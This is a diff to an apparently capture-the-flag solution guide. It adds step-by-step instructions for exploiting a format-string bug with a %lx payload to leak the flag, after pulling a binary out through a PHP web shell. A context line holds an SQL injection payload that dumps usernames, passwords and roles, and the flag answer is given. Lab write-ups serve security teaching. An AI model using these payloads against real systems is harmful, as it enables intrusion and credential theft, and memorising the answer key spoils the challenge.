@@ -94,4 +94,56 @@ sql', review_text=(SELECT GROUP_CONCAT(CONCAT(username,':',password,':',role) SE
    1. Execute ls or dir to list files in the current directory
    2. Look for flag.txt
 
-## Flag 3: Buffer Overflow
+## Flag 3: Format String Vulnerability
+
+**Name**: Secret Executable Flag #1
+**Location**: challenge/web/uploads/vuln
+**Flag** Format: CTF{}
+
+1. Gain Admin Access  
+   1. Complete Flag 2 to obtain access to the PHP web shell.
+
+2. Download the Vulnerable Binary  
+   1. List the files and locate the base64-encoded binary named `vuln`.
+   2. Base64-encode the binary on the server so you can copy it:
+      ```sh
+      base64 ./vuln
+      ```
+
+3. Decode and Prepare the Binary  
+   1. On your local machine, decode the base64 and make it executable.
+
+4. Run the Binary in Docker  
+   1. Move the decoded `vuln` binary to the `challenge/secret-executable` directory.
+   2. Build and run the Docker container:
+      ```sh
+      docker build -t secret-vuln .
+      docker run -it --rm secret-vuln
+      ```
+
+5. Exploit the Format String Vulnerability  
+   1. When prompted with:
+      ```
+      Welcome to HeadOfCoffee's Secret Order Printer!
+      Place your custom order below:
+      ```
+   2. Enter the following format string payload to dump memory:
+      ```
+      %lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx
+      ```
+
+6. Extract the Flag  
+   1. The output will display hexadecimal values from the stack. Look for values that resemble ASCII when converted.
+   2. Example output:
+      ```
+      6e6133627b465443
+      355f646e336c625f
+      ```
+   3. Reverse the byte order of each 64-bit chunk (little-endian) to reveal the flag:
+      - `6e6133627b465443` → `CTF{b3an`
+      - `355f646e336c625f` → `_bl3nd_5`
+   4. Combine the parts to get the full flag:
+      ```
+      CTF{b3an_bl3nd_5}
+      ```
+
